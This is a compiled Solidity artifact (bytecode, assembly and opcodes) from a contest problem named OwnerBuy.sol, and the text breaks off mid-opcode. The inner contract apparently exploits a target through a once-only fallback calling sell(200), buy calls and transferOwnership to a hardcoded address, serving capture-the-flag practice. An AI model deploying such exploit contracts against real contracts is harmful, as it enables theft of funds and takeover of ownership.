60806040526109eb806100136000396000f3fe6080604052600436106100915760003560e01c8063a6f2ae3a11610059578063a6f2ae3a1461027e578063d56b288914610295578063df05f42e146102ac578063ead4d3db146102c3578063f9dca989146102f257610091565b806306661abd1461017457806319ab453c146101a35780632f54bf6e146101e757806345710074146102505780637e10e9d114610267575b600060149054906101000a900460ff16610172576001600060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561013557600080fd5b505af1158015610149573d6000803e3d6000fd5b505050506040513d602081101561015f57600080fd5b8101908080519060200190929190505050505b005b34801561018057600080fd5b50610189610309565b604051808215151515815260200191505060405180910390f35b6101e5600480360360208110156101b957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061031c565b005b3480156101f357600080fd5b506102366004803603602081101561020a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035f565b604051808215151515815260200191505060405180910390f35b34801561025c57600080fd5b506102656103bc565b005b34801561027357600080fd5b5061027c61046f565b005b34801561028a57600080fd5b5061029361064a565b005b3480156102a157600080fd5b506102aa6106f3565b005b3480156102b857600080fd5b506102c161079a565b005b3480156102cf57600080fd5b506102d8610868565b604051808215151515815260200191505060405180910390f35b3480156102fe57600080fd5b5061030761087b565b005b600060149054906101000a900460ff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008060159054906101000a900460ff16610398576001600060156101000a81548160ff021916908315150217905550600090506103b7565b60008060156101000a81548160ff021916908315150217905550600190505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561043157600080fd5b505af1158015610445573d6000803e3d6000fd5b505050506040513d602081101561045b57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561050f57600080fd5b505af1158015610523573d6000803e3d6000fd5b505050506040513d602081101561053957600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561060c57600080fd5b505af1158015610620573d6000803e3d6000fd5b505050506040513d602081101561063657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156106b457600080fd5b505af11580156106c8573d6000803e3d6000fd5b50505050506040513d60208110156106df57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561075c57600080fd5b505af1158015610770573d6000803e3d6000fd5b505050506040513d602081101561078657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561084e57600080fd5b505af1158015610862573d6000803e3d6000fd5b50505050565b600060159054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561091b57600080fd5b505af115801561092f573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561099c57600080fd5b505af11580156109b0573d6000803e3d6000fd5b5050505056fea265627a7a72315820490de0313b1ad79570c77ae043ce5fe65f40e32cd15657be89fd034ab9e52c2464736f6c63430005110032\n\nsub_0: assembly {\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5234:10771  contract deployed{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":5234:10771  contract deployed{\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x2b85ba38\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd13319c4\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10416:10659  function deploy(bytes32 salt) public returns(address) {\r... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_6\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_6:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10416:10659  function deploy(bytes32 salt) public returns(address) {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10665:10768  function getHash()public view returns(bytes32){\r... */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10416:10659  function deploy(bytes32 salt) public returns(address) {\r... */\n    tag_7:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10461:10468  address */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10477:10498  bytes memory bytecode */\n      0x60\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10501:10517  contractBytecode */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10477:10517  bytes memory bytecode = contractBytecode */\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      0x1f\n      add\n      0x20\n      dup1\n      swap2\n      div\n      mul\n      0x20\n      add\n      mload(0x40)\n      swap1\n      dup2\n      add\n      0x40\n      mstore\n      dup1\n      swap3\n      swap2\n      swap1\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_11\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_12\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      0x20\n      add\n      swap2\n      jump(tag_11)\n    tag_12:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_13:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_13\n      jumpi\n      dup3\n      swap1\n      sub\n      0x1f\n      and\n      dup3\n      add\n      swap2\n    tag_11:\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10524:10536  address addr */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10626:10630  salt */\n      dup4\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10615:10623  bytecode */\n      dup3\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10609:10624  mload(bytecode) */\n      mload\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10602:10606  0x20 */\n      0x20\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10592:10600  bytecode */\n      dup5\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10588:10607  add(bytecode, 0x20) */\n      add\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10585:10586  0 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10577:10631  create2(0, add(bytecode, 0x20), mload(bytecode), salt) */\n      create2\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10569:10631  addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt) */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10651:10655  addr */\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10644:10655  return addr */\n      swap3\n      pop\n      pop\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10416:10659  function deploy(bytes32 salt) public returns(address) {\r... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10665:10768  function getHash()public view returns(bytes32){\r... */\n    tag_9:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10703:10710  bytes32 */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10739:10755  contractBytecode */\n      dup1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10729:10756  keccak256(contractBytecode) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      sload\n      0x01\n      dup2\n      0x01\n      and\n      iszero\n      0x0100\n      mul\n      sub\n      and\n      0x02\n      swap1\n      div\n      dup1\n      iszero\n      tag_15\n      jumpi\n      dup1\n      0x1f\n      lt\n      tag_16\n      jumpi\n      0x0100\n      dup1\n      dup4\n      sload\n      div\n      mul\n      dup4\n      mstore\n      swap2\n      dup3\n      add\n      swap2\n      jump(tag_15)\n    tag_16:\n      dup3\n      add\n      swap2\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      swap1\n    tag_17:\n      dup2\n      sload\n      dup2\n      mstore\n      swap1\n      0x01\n      add\n      swap1\n      0x20\n      add\n      dup1\n      dup4\n      gt\n      tag_17\n      jumpi\n    tag_15:\n      pop\n      pop\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      keccak256\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10722:10756  return keccak256(contractBytecode) */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":10665:10768  function getHash()public view returns(bytes32){\r... */\n      swap1\n      jump\t// out\n\n    auxdata: 0xa265627a7a7231582061d868efb6f224ae8c36f2a57c1bc8c70922b32b38bbed0a91402ed73da8966a64736f6c63430005110032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405260405180610a2001604052806109fe81526020016103216109fe913960009080519060200190610035929190610048565b5034801561004257600080fd5b506100ed565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061008957805160ff19168380011785556100b7565b828001600101855582156100b7579182015b828111156100b657825182559160200191906001019061009b565b5b5090506100c491906100c8565b5090565b6100ea91905b808211156100e65760008160009055506001016100ce565b5090565b90565b610225806100fc6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80632b85ba381461003b578063d13319c4146100a9575b600080fd5b6100676004803603602081101561005157600080fd5b81019080803590602001909291905050506100c7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6100b1610180565b6040518082815260200191505060405180910390f35b6000606060008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156101615780601f1061013657610100808354040283529160200191610161565b820191906000526020600020905b81548152906001019060200180831161014457829003601f168201915b505050505090506000838251602084016000f590508092505050919050565b60008060405180828054600181600116156101000203166002900480156101de5780601f106101bc5761010080835404028352918201916101de565b820191906000526020600020905b8154815290600101906020018083116101ca575b5050915050604051809103902090509056fea265627a7a7231582061d868efb6f224ae8c36f2a57c1bc8c70922b32b38bbed0a91402ed73da8966a64736f6c6343000511003260806040526109eb806100136000396000f3fe6080604052600436106100915760003560e01c8063a6f2ae3a11610059578063a6f2ae3a1461027e578063d56b288914610295578063df05f42e146102ac578063ead4d3db146102c3578063f9dca989146102f257610091565b806306661abd1461017457806319ab453c146101a35780632f54bf6e146101e757806345710074146102505780637e10e9d114610267575b600060149054906101000a900460ff16610172576001600060146101000a81548160ff0219169083151502179055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561013557600080fd5b505af1158015610149573d6000803e3d6000fd5b505050506040513d602081101561015f57600080fd5b8101908080519060200190929190505050505b005b34801561018057600080fd5b50610189610309565b604051808215151515815260200191505060405180910390f35b6101e5600480360360208110156101b957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061031c565b005b3480156101f357600080fd5b506102366004803603602081101561020a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061035f565b604051808215151515815260200191505060405180910390f35b34801561025c57600080fd5b506102656103bc565b005b34801561027357600080fd5b5061027c61046f565b005b34801561028a57600080fd5b5061029361064a565b005b3480156102a157600080fd5b506102aa6106f3565b005b3480156102b857600080fd5b506102c161079a565b005b3480156102cf57600080fd5b506102d8610868565b604051808215151515815260200191505060405180910390f35b3480156102fe57600080fd5b5061030761087b565b005b600060149054906101000a900460ff1681565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b60008060159054906101000a900460ff16610398576001600060156101000a81548160ff021916908315150217905550600090506103b7565b60008060156101000a81548160ff021916908315150217905550600190505b919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e4849b3260c86040518263ffffffff1660e01b815260040180828152602001915050602060405180830381600087803b15801561043157600080fd5b505af1158015610445573d6000803e3d6000fd5b505050506040513d602081101561045b57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561050f57600080fd5b505af1158015610523573d6000803e3d6000fd5b505050506040513d602081101561053957600080fd5b8101908080519060200190929190505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663c03646ba6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561060c57600080fd5b505af1158015610620573d6000803e3d6000fd5b505050506040513d602081101561063657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a60016040518263ffffffff1660e01b81526004016020604051808303818588803b1580156106b457600080fd5b505af11580156106c8573d6000803e3d6000fd5b50505050506040513d60208110156106df57600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d56b28896040518163ffffffff1660e01b8152600401602060405180830381600087803b15801561075c57600080fd5b505af1158015610770573d6000803e3d6000fd5b505050506040513d602081101561078657600080fd5b810190808051906020019092919050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f2fde38b73220866b1a2219f40e72f5c628b65d54268ca3a9d6040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561084e57600080fd5b505af1158015610862573d6000803e3d6000fd5b50505050565b600060159054906101000a900460ff1681565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166351ec819f306040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801561091b57600080fd5b505af115801561092f573d6000803e3d6000fd5b505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166362a094776040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561099c57600080fd5b505af11580156109b0573d6000803e3d6000fd5b5050505056fea265627a7a72315820490de0313b1ad79570c77ae043ce5fe65f40e32cd15657be89fd034ab9e52c2464736f6c63430005110032",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x40 MLOAD DUP1 PUSH2 0xA20 ADD PUSH1 0x40 MSTORE DUP1 PUSH2 0x9FE DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x321 PUSH2 0x9FE SWAP2 CODECOPY PUSH1 0x0 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH2 0x35 SWAP3 SWAP2 SWAP1 PUSH2 0x48 JUMP JUMPDEST POP CALLVALUE DUP1 ISZERO PUSH2 0x42 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xED JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH2 0x89 JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH2 0xB7 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH2 0xB7 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH2 0xB6 JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH2 0x9B JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH2 0xC4 SWAP2 SWAP1 PUSH2 0xC8 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH2 0xEA SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH2 0xE6 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH2 0xCE JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x225 DUP1 PUSH2 0xFC PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2B85BA38 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xD13319C4 EQ PUSH2 0xA9 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x67 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xB1 PUSH2 0x180 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 PUSH1 0x60 PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x161 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x136 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x161 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x144 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP PUSH1 0x0 DUP4 DUP3 MLOAD PUSH1 0x20 DUP5 ADD PUSH1 0x0 CREATE2 SWAP1 POP DUP1 SWAP3 POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 MLOAD DUP1 DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x1DE JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x1BC JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 DUP3 ADD SWAP2 PUSH2 0x1DE JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x1CA JUMPI JUMPDEST POP POP SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 SWAP1 POP SWAP1 JUMP INVALID LOG2 PUSH6 0x627A7A723158 KECCAK256 PUSH2 0xD868 0xEF 0xB6 CALLCODE 0x24 0xAE DUP13 CALLDATASIZE CALLCODE 0xA5 PUSH29 0x1BC8C70922B32B38BBED0A91402ED73DA8966A64736F6C634300051100 ORIGIN PUSH1 0x80 PUSH1 0x40 MSTORE PUSH2 0x9EB DUP1 PUSH2 0x13 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x91 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xA6F2AE3A GT PUSH2 0x59 JUMPI DUP1 PUSH4 0xA6F2AE3A EQ PUSH2 0x27E JUMPI DUP1 PUSH4 0xD56B2889 EQ PUSH2 0x295 JUMPI DUP1 PUSH4 0xDF05F42E EQ PUSH2 0x2AC JUMPI DUP1 PUSH4 0xEAD4D3DB EQ PUSH2 0x2C3 JUMPI DUP1 PUSH4 0xF9DCA989 EQ PUSH2 0x2F2 JUMPI PUSH2 0x91 JUMP JUMPDEST DUP1 PUSH4 0x6661ABD EQ PUSH2 0x174 JUMPI DUP1 PUSH4 0x19AB453C EQ PUSH2 0x1A3 JUMPI DUP1 PUSH4 0x2F54BF6E EQ PUSH2 0x1E7 JUMPI DUP1 PUSH4 0x45710074 EQ PUSH2 0x250 JUMPI DUP1 PUSH4 0x7E10E9D1 EQ PUSH2 0x267 JUMPI JUMPDEST PUSH1 0x0 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x172 JUMPI PUSH1 0x1 PUSH1 0x0 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xE4849B32 PUSH1 0xC8 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x135 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x149 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x15F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP POP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x180 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x189 PUSH2 0x309 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x1E5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x1B9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x31C JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1F3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x236 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x20A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 